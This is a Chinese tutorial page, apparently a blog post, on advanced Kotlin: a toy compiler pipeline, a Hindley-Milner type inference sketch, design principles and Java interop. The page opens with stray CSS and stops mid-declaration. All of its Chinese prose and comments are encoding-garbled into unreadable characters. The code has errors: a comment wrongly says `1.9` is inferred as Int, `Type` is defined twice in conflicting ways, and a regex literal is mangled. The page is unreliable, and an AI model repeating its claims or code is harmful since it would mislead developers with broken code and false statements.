h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¥½çš„ï¼Œæˆ‘ä»¬å°†ç»§ç»­å‘ Kotlin çš„æ›´æ·±å±‚æ¬¡æ¢ç´¢ã€‚è¿™éƒ¨åˆ†å°†æ¶µç›–<strong>ç¼–è¯‘å™¨å†…éƒ¨åŸç†ã€è¯­è¨€è®¾è®¡å“²å­¦ã€é«˜çº§ç±»å‹ç³»ç»Ÿ</strong>ä»¥åŠ<strong>ä¸å…¶ä»–è¯­è¨€çš„äº’æ“ä½œ</strong>ç­‰ä¸“å®¶çº§ä¸»é¢˜ã€‚</p>
<hr/>
<h3 data-id="heading-0"><strong>Kotlin ä¸“å®¶çº§æ¢ç´¢ï¼šè¯­è¨€è®¾è®¡ä¸å®ç°åŸç†</strong></h3>
<h4 data-id="heading-1"><strong>å››åå…­ã€Kotlin ç¼–è¯‘å™¨å†…éƒ¨åŸç†</strong></h4>
<h5 data-id="heading-2"><strong>1. ç¼–è¯‘å™¨é˜¶æ®µä¸ IRï¼ˆä¸­é—´è¡¨ç¤ºï¼‰</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ç†è§£ Kotlin ç¼–è¯‘è¿‡ç¨‹ï¼šæºä»£ç  â†’ AST â†’ IR â†’ ç›®æ ‡ä»£ç </span>

<span class="hljs-comment">// æ¨¡æ‹Ÿç¼–è¯‘å™¨å¤„ç†è¿‡ç¨‹çš„æ¦‚å¿µæ€§ä»£ç </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CompilerPhase</span> {
    
    <span class="hljs-comment">// 1. è¯æ³•åˆ†æ</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">lexicalAnalysis</span><span class="hljs-params">(source: <span class="hljs-type">String</span>)</span></span>: List&lt;Token&gt; {
        <span class="hljs-keyword">return</span> source.split(<span class="hljs-string">"\s+"</span>.toRegex())
            .filter { it.isNotBlank() }
            .map { Token(it) }
    }
    
    <span class="hljs-comment">// 2. è¯­æ³•åˆ†æï¼ˆç”Ÿæˆ ASTï¼‰</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">parse</span><span class="hljs-params">(tokens: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Token</span>&gt;)</span></span>: ASTNode {
        <span class="hljs-comment">// ç®€åŒ–çš„è§£æé€»è¾‘</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> {
            tokens.size == <span class="hljs-number">1</span> -&gt; ASTNode.Leaf(tokens.first())
            <span class="hljs-keyword">else</span> -&gt; ASTNode.Branch(tokens.first(), tokens.drop(<span class="hljs-number">1</span>).map { ASTNode.Leaf(it) })
        }
    }
    
    <span class="hljs-comment">// 3. è¯­ä¹‰åˆ†æï¼ˆç±»å‹æ£€æŸ¥ç­‰ï¼‰</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">semanticAnalysis</span><span class="hljs-params">(ast: <span class="hljs-type">ASTNode</span>)</span></span>: TypedASTNode {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (ast) {
            <span class="hljs-keyword">is</span> ASTNode.Leaf -&gt; TypedASTNode.TypedLeaf(ast.token, inferType(ast.token))
            <span class="hljs-keyword">is</span> ASTNode.Branch -&gt; TypedASTNode.TypedBranch(ast, ast.children.map { semanticAnalysis(it) })
        }
    }
    
    <span class="hljs-comment">// 4. ç”Ÿæˆ IR</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">generateIR</span><span class="hljs-params">(typedAst: <span class="hljs-type">TypedASTNode</span>)</span></span>: IRNode {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (typedAst) {
            <span class="hljs-keyword">is</span> TypedASTNode.TypedLeaf -&gt; IRNode.Constant(typedAst.token.value, typedAst.type)
            <span class="hljs-keyword">is</span> TypedASTNode.TypedBranch -&gt; IRNode.FunctionCall(typedAst.node.token.value, 
                typedAst.children.map { generateIR(it) })
        }
    }
    
    <span class="hljs-comment">// 5. ç›®æ ‡ä»£ç ç”Ÿæˆ</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">generateTargetCode</span><span class="hljs-params">(ir: <span class="hljs-type">IRNode</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (ir) {
            <span class="hljs-keyword">is</span> IRNode.Constant -&gt; <span class="hljs-string">"push <span class="hljs-subst">${ir.value}</span>"</span>
            <span class="hljs-keyword">is</span> IRNode.FunctionCall -&gt; 
                ir.arguments.joinToString(<span class="hljs-string">"\n"</span>) { generateTargetCode(it) } + <span class="hljs-string">"\ncall <span class="hljs-subst">${ir.functionName}</span>"</span>
        }
    }
}

<span class="hljs-comment">// ç¼–è¯‘å™¨æ•°æ®ç»“æ„</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Token</span>(<span class="hljs-keyword">val</span> value: String)

<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ASTNode</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Leaf</span>(<span class="hljs-keyword">val</span> token: Token) : ASTNode()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Branch</span>(<span class="hljs-keyword">val</span> token: Token, <span class="hljs-keyword">val</span> children: List&lt;ASTNode&gt;) : ASTNode()
}

<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypedASTNode</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypedLeaf</span>(<span class="hljs-keyword">val</span> token: Token, <span class="hljs-keyword">val</span> type: Type) : TypedASTNode()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypedBranch</span>(<span class="hljs-keyword">val</span> node: ASTNode.Branch, <span class="hljs-keyword">val</span> children: List&lt;TypedASTNode&gt;) : TypedASTNode()
}

<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IRNode</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Constant</span>(<span class="hljs-keyword">val</span> value: String, <span class="hljs-keyword">val</span> type: Type) : IRNode()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionCall</span>(<span class="hljs-keyword">val</span> functionName: String, <span class="hljs-keyword">val</span> arguments: List&lt;IRNode&gt;) : IRNode()
}

<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Type</span>(<span class="hljs-keyword">val</span> name: String)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">inferType</span><span class="hljs-params">(token: <span class="hljs-type">Token</span>)</span></span>: Type = <span class="hljs-keyword">when</span> {
    token.value.matches(Regex(<span class="hljs-string">"\d+"</span>)) -&gt; Type(<span class="hljs-string">"Int"</span>)
    token.value.matches(Regex(<span class="hljs-string">""</span>.*<span class="hljs-string">""</span>)) -&gt; Type(<span class="hljs-string">"String"</span>)
    <span class="hljs-keyword">else</span> -&gt; Type(<span class="hljs-string">"Unknown"</span>)
}

<span class="hljs-comment">// æµ‹è¯•ç¼–è¯‘å™¨æµç¨‹</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testCompilerPhases</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> source = <span class="hljs-string">"add 1 2"</span>
    <span class="hljs-keyword">val</span> compiler = CompilerPhase()
    
    <span class="hljs-keyword">val</span> tokens = compiler.lexicalAnalysis(source)
    println(<span class="hljs-string">"è¯æ³•åˆ†æ: <span class="hljs-variable">$tokens</span>"</span>)
    
    <span class="hljs-keyword">val</span> ast = compiler.parse(tokens)
    println(<span class="hljs-string">"è¯­æ³•åˆ†æ: <span class="hljs-variable">$ast</span>"</span>)
    
    <span class="hljs-keyword">val</span> typedAst = compiler.semanticAnalysis(ast)
    println(<span class="hljs-string">"è¯­ä¹‰åˆ†æ: <span class="hljs-variable">$typedAst</span>"</span>)
    
    <span class="hljs-keyword">val</span> ir = compiler.generateIR(typedAst)
    println(<span class="hljs-string">"ä¸­é—´è¡¨ç¤º: <span class="hljs-variable">$ir</span>"</span>)
    
    <span class="hljs-keyword">val</span> targetCode = compiler.generateTargetCode(ir)
    println(<span class="hljs-string">"ç›®æ ‡ä»£ç :\n<span class="hljs-variable">$targetCode</span>"</span>)
}
</code></pre>
<h5 data-id="heading-3"><strong>2. ç±»å‹æ¨æ–­ç®—æ³•åŸç†</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ç®€åŒ–çš„ Hindley-Milner ç±»å‹æ¨æ–­ç®—æ³•æ¦‚å¿µå®ç°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeInferenceEngine</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> typeVariables = mutableMapOf&lt;String, Type&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> constraints = mutableListOf&lt;Constraint&gt;()
    
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeScheme</span>(<span class="hljs-keyword">val</span> variables: List&lt;String&gt;, <span class="hljs-keyword">val</span> type: Type)
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Constraint</span>(<span class="hljs-keyword">val</span> left: Type, <span class="hljs-keyword">val</span> right: Type)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">infer</span><span class="hljs-params">(expression: <span class="hljs-type">Expression</span>)</span></span>: TypeScheme {
        <span class="hljs-keyword">val</span> freshType = freshTypeVariable()
        <span class="hljs-keyword">val</span> context = emptyMap&lt;String, TypeScheme&gt;()
        <span class="hljs-keyword">return</span> inferExpression(expression, context, freshType)
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">inferExpression</span><span class="hljs-params">(expr: <span class="hljs-type">Expression</span>, context: <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, TypeScheme&gt;, 
                              resultType: <span class="hljs-type">Type</span>)</span></span>: TypeScheme {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (expr) {
            <span class="hljs-keyword">is</span> Expression.Variable -&gt; {
                <span class="hljs-keyword">val</span> scheme = context[expr.name] ?: <span class="hljs-keyword">throw</span> Exception(<span class="hljs-string">"æœªå®šä¹‰çš„å˜é‡: <span class="hljs-subst">${expr.name}</span>"</span>)
                instantiate(scheme)
            }
            <span class="hljs-keyword">is</span> Expression.Lambda -&gt; {
                <span class="hljs-keyword">val</span> paramType = freshTypeVariable()
                <span class="hljs-keyword">val</span> newContext = context + (expr.param to TypeScheme(emptyList(), paramType))
                <span class="hljs-keyword">val</span> bodyType = inferExpression(expr.body, newContext, resultType)
                TypeScheme(emptyList(), Type.Function(paramType, bodyType.type))
            }
            <span class="hljs-keyword">is</span> Expression.Application -&gt; {
                <span class="hljs-keyword">val</span> functionType = inferExpression(expr.function, context, freshTypeVariable())
                <span class="hljs-keyword">val</span> argType = inferExpression(expr.argument, context, freshTypeVariable())
                constraints.add(Constraint(functionType.type, Type.Function(argType.type, resultType)))
                TypeScheme(emptyList(), resultType)
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">unify</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">while</span> (constraints.isNotEmpty()) {
            <span class="hljs-keyword">val</span> constraint = constraints.removeFirst()
            unifyTypes(constraint.left, constraint.right)
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">unifyTypes</span><span class="hljs-params">(t1: <span class="hljs-type">Type</span>, t2: <span class="hljs-type">Type</span>)</span></span> {
        <span class="hljs-keyword">when</span> {
            t1 == t2 -&gt; <span class="hljs-keyword">return</span>
            t1 <span class="hljs-keyword">is</span> Type.Variable -&gt; bindVariable(t1.name, t2)
            t2 <span class="hljs-keyword">is</span> Type.Variable -&gt; bindVariable(t2.name, t1)
            t1 <span class="hljs-keyword">is</span> Type.Function &amp;&amp; t2 <span class="hljs-keyword">is</span> Type.Function -&gt; {
                constraints.add(Constraint(t1.from, t2.from))
                constraints.add(Constraint(t1.to, t2.to))
            }
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-keyword">throw</span> Exception(<span class="hljs-string">"ç±»å‹ä¸åŒ¹é…: <span class="hljs-variable">$t1</span> å’Œ <span class="hljs-variable">$t2</span>"</span>)
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">bindVariable</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, type: <span class="hljs-type">Type</span>)</span></span> {
        <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">is</span> Type.Variable &amp;&amp; type.name == name) <span class="hljs-keyword">return</span>
        <span class="hljs-keyword">if</span> (occursCheck(name, type)) <span class="hljs-keyword">throw</span> Exception(<span class="hljs-string">"æ— é™ç±»å‹"</span>)
        typeVariables[name] = type
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">occursCheck</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, type: <span class="hljs-type">Type</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (type) {
            <span class="hljs-keyword">is</span> Type.Variable -&gt; type.name == name
            <span class="hljs-keyword">is</span> Type.Function -&gt; occursCheck(name, type.from) || occursCheck(name, type.to)
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-literal">false</span>
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">freshTypeVariable</span><span class="hljs-params">()</span></span>: Type.Variable {
        <span class="hljs-keyword">return</span> Type.Variable(<span class="hljs-string">"T<span class="hljs-subst">${typeVariables.size}</span>"</span>)
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">instantiate</span><span class="hljs-params">(scheme: <span class="hljs-type">TypeScheme</span>)</span></span>: TypeScheme {
        <span class="hljs-keyword">val</span> substitutions = scheme.variables.associateWith { freshTypeVariable() }
        <span class="hljs-keyword">return</span> TypeScheme(emptyList(), substitute(scheme.type, substitutions))
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">substitute</span><span class="hljs-params">(type: <span class="hljs-type">Type</span>, substitutions: <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, Type&gt;)</span></span>: Type {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (type) {
            <span class="hljs-keyword">is</span> Type.Variable -&gt; substitutions[type.name] ?: type
            <span class="hljs-keyword">is</span> Type.Function -&gt; Type.Function(
                substitute(type.from, substitutions),
                substitute(type.to, substitutions)
            )
            <span class="hljs-keyword">else</span> -&gt; type
        }
    }
}

<span class="hljs-comment">// è¡¨è¾¾å¼å’Œç±»å‹å®šä¹‰</span>
<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Expression</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Variable</span>(<span class="hljs-keyword">val</span> name: String) : Expression()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Lambda</span>(<span class="hljs-keyword">val</span> param: String, <span class="hljs-keyword">val</span> body: Expression) : Expression()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span>(<span class="hljs-keyword">val</span> function: Expression, <span class="hljs-keyword">val</span> argument: Expression) : Expression()
}

<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Type</span> {
    <span class="hljs-keyword">object</span> <span class="hljs-built_in">Int</span> : Type()
    <span class="hljs-keyword">object</span> Bool : Type()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Variable</span>(<span class="hljs-keyword">val</span> name: String) : Type()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Function</span>(<span class="hljs-keyword">val</span> from: Type, <span class="hljs-keyword">val</span> to: Type) : Type()
}
</code></pre>
<h4 data-id="heading-4"><strong>å››åä¸ƒã€Kotlin è¯­è¨€è®¾è®¡å“²å­¦</strong></h4>
<h5 data-id="heading-5"><strong>1. å®ç”¨ä¸»ä¹‰è®¾è®¡åŸåˆ™</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. ç©ºå®‰å…¨ï¼šç¼–è¯‘æ—¶é˜²æ­¢è¿è¡Œæ—¶é”™è¯¯</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NullSafetyPrinciples</span> {
    
    <span class="hljs-comment">// å®‰å…¨è°ƒç”¨æ“ä½œç¬¦çš„è®¾è®¡å“²å­¦</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateSafeCall</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> nullableString: String? = getPossiblyNullString()
        
        <span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼ˆå®¹æ˜“å¿˜è®°æ£€æŸ¥ï¼‰</span>
        <span class="hljs-comment">// val length = nullableString.length // ç¼–è¯‘é”™è¯¯ï¼</span>
        
        <span class="hljs-comment">// Kotlin æ–¹å¼ï¼ˆå¼ºåˆ¶å¤„ç†ç©ºå€¼ï¼‰</span>
        <span class="hljs-keyword">val</span> safeLength = nullableString?.length ?: <span class="hljs-number">0</span>
        println(<span class="hljs-string">"å®‰å…¨é•¿åº¦: <span class="hljs-variable">$safeLength</span>"</span>)
    }
    
    <span class="hljs-comment">// ç±»å‹ç³»ç»Ÿçš„å®ç”¨ä¸»ä¹‰</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateTypeSystem</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// ç±»å‹æ¨æ–­ï¼šå‡å°‘æ ·æ¿ä»£ç </span>
        <span class="hljs-keyword">val</span> name = <span class="hljs-string">"Kotlin"</span> <span class="hljs-comment">// ç¼–è¯‘å™¨æ¨æ–­ä¸º String</span>
        <span class="hljs-keyword">val</span> version = <span class="hljs-number">1.9</span>   <span class="hljs-comment">// ç¼–è¯‘å™¨æ¨æ–­ä¸º Int</span>
        
        <span class="hljs-comment">// æ™ºèƒ½è½¬æ¢ï¼šå‡å°‘æ˜¾å¼ç±»å‹è½¬æ¢</span>
        <span class="hljs-keyword">val</span> obj: Any = <span class="hljs-string">"Hello"</span>
        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">is</span> String) {
            println(obj.length) <span class="hljs-comment">// è‡ªåŠ¨è½¬æ¢ä¸º String</span>
        }
    }
}

<span class="hljs-comment">// 2. æ‰©å±•å‡½æ•°çš„å“²å­¦ï¼šå¼€æ”¾å°é—­åŸåˆ™</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">DesignPrinciples</span> {
    <span class="hljs-comment">// å¯¹æ‰©å±•å¼€æ”¾ï¼šå¯ä»¥ä¸ºç°æœ‰ç±»æ·»åŠ æ–°åŠŸèƒ½</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">addEmphasis</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"**<span class="hljs-variable">$this</span>**"</span>
    
    <span class="hljs-comment">// å¯¹ä¿®æ”¹å°é—­ï¼šä¸éœ€è¦ä¿®æ”¹åŸå§‹ç±»</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateExtensionPhilosophy</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> text = <span class="hljs-string">"é‡è¦ä¿¡æ¯"</span>
        println(text.addEmphasis()) <span class="hljs-comment">// è¾“å‡ºï¼š**é‡è¦ä¿¡æ¯**</span>
    }
}

<span class="hljs-comment">// 3. å‡½æ•°å¼ç¼–ç¨‹ä¸é¢å‘å¯¹è±¡çš„èåˆ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionalOOFusion</span> {
    
    <span class="hljs-comment">// é«˜é˜¶å‡½æ•°ï¼šå‡½æ•°æ˜¯ä¸€ç­‰å…¬æ°‘</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">filterWithLogging</span><span class="hljs-params">(predicate: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: List&lt;T&gt; {
        println(<span class="hljs-string">"å¼€å§‹è¿‡æ»¤åˆ—è¡¨ï¼Œå¤§å°: <span class="hljs-subst">${this.size}</span>"</span>)
        <span class="hljs-keyword">val</span> result = <span class="hljs-keyword">this</span>.filter(predicate)
        println(<span class="hljs-string">"è¿‡æ»¤å®Œæˆï¼Œç»“æœå¤§å°: <span class="hljs-subst">${result.size}</span>"</span>)
        <span class="hljs-keyword">return</span> result
    }
    
    <span class="hljs-comment">// æ•°æ®ç±»ï¼šä¸å¯å˜æ€§çš„ä»·å€¼</span>
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImmutablePoint</span>(<span class="hljs-keyword">val</span> x: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> y: <span class="hljs-built_in">Int</span>) {
        <span class="hljs-comment">// è€Œä¸æ˜¯æä¾› setterï¼Œæä¾›è½¬æ¢æ–¹æ³•</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">move</span><span class="hljs-params">(dx: <span class="hljs-type">Int</span>, dy: <span class="hljs-type">Int</span>)</span></span>: ImmutablePoint = copy(x = x + dx, y = y + dy)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateImmutability</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> point = ImmutablePoint(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)
        <span class="hljs-keyword">val</span> moved = point.move(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)
        println(<span class="hljs-string">"åŸå§‹ç‚¹: <span class="hljs-variable">$point</span>, ç§»åŠ¨å: <span class="hljs-variable">$moved</span>"</span>) <span class="hljs-comment">// åŸå§‹å¯¹è±¡ä¿æŒä¸å˜</span>
    }
}

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getPossiblyNullString</span><span class="hljs-params">()</span></span>: String? = <span class="hljs-keyword">if</span> (System.currentTimeMillis() % <span class="hljs-number">2</span> == <span class="hljs-number">0L</span>) <span class="hljs-string">"éç©º"</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">null</span>
</code></pre>
<h5 data-id="heading-6"><strong>2. Kotlin ä¸ Java çš„äº’æ“ä½œè®¾è®¡</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. ç©ºå€¼æ³¨è§£çš„äº’æ“ä½œ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaInteropDesign</span> {
    
    <span class="hljs-comment">// Java ä»£ç ä¸­çš„æ³¨è§£ï¼š</span>
    <span class="hljs-comment">// @Nullable String getNullableString();</span>
    <span class="hljs-comment">// @NotNull String getNotNullString();</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleJavaNullability</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// Kotlin ç¼–è¯‘å™¨ç†è§£è¿™äº›æ³¨è§£</span>
        <span class="hljs-keyword">val</span> nullable: String? = JavaClass().nullableString <span class="hljs-comment">// å¯ç©ºç±»å‹</span>
        <span class="hljs-keyword">val</span> notNull: String = JavaClass().notNullString    <span class="hljs-comment">// éç©ºç±»å‹</span>
        
        println(<span class="hljs-string">"å¯ç©º: <span class="hljs-variable">$nullable</span>, éç©º: <span class="hljs-variable">$notNull</span>"</span>)
    }
    
    <span class="hljs-comment">// 2. é›†åˆç±»å‹çš„äº’æ“ä½œ</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleJavaCollections</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> javaList: java.util.ArrayList&lt;String&gt; = JavaClass().getStringList()
        
        <span class="hljs-comment">// Kotlin æä¾›æ‰©å±•å‡½æ•°ä½¿ Java é›†åˆæ›´æ˜“ç”¨</span>
        <span class="hljs-keyword">val</span> kotlinList = javaList.filter { it.length &gt; <span class="hljs-number">3</span> }
                                  .map { it.uppercase() }
        
        println(<span class="hljs-string">"è½¬æ¢åçš„åˆ—è¡¨: <span class="hljs-variable">$kotlinList</span>"</span>)
    }
    
    <span class="hljs-comment">// 3. SAMï¼ˆSingle Abstract Methodï¼‰è½¬æ¢</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleSamConversion</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> javaClass = JavaClass()
        
        <span class="hljs-comment">// Java ä¸­çš„æ¥å£ï¼šinterface Runnable { void run(); }</span>
        <span class="hljs-comment">// åœ¨ Kotlin ä¸­å¯ä»¥ä½¿ç”¨ lambda</span>
        javaClass.runWithCallback { 
            println(<span class="hljs-string">"SAM è½¬æ¢ï¼šä» Kotlin ä¼ é€’ lambda åˆ° Java"</span>)
        }
    }
    
    <span class="hljs-comment">// 4. ä¼´ç”Ÿå¯¹è±¡ä¸é™æ€æ–¹æ³•çš„äº’æ“ä½œ</span>
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-meta">@JvmStatic</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">staticMethodForJava</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"Java å¯ä»¥åƒè°ƒç”¨é™æ€æ–¹æ³•ä¸€æ ·è°ƒç”¨æˆ‘"</span>
        
        <span class="hljs-meta">@JvmField</span>
